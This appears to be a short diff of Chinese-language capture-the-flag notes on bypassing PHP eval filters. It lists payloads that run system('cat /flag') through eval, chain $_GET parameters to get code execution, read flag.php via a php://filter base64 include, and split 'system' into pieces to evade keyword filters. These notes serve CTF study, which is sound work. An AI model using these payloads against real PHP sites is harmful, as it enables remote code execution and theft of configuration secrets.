@@ -1,4 +1,4 @@
-在线php运行：<https://www.jyshare.com/compile/1/>
+u在线php运行：<https://www.jyshare.com/compile/1/>
 
 
 
@@ -13,7 +13,7 @@ eval('system('cat /flag')?> ');    // 分号可以用?>替换。 且后面代码
 /?c=eval($_GET[a]);&a=system('cat flag.php');  //绕过eval有限制。
 eval('eval($_GET[a])?>')  
 
-/?c=include"$_GET[a]“?>&a=php://filter/read=convert.base64 -encode/resource=flag.php
+/?c=include"$_GET[a]“?>&a=php://filter/read=convert.base64 -encode/resource=flag.php //过滤了(
 
 eval("$x='sys';  $y='tem';  $z=$x.$y;  $z('cat config.php');" );         //绕过过滤。
 
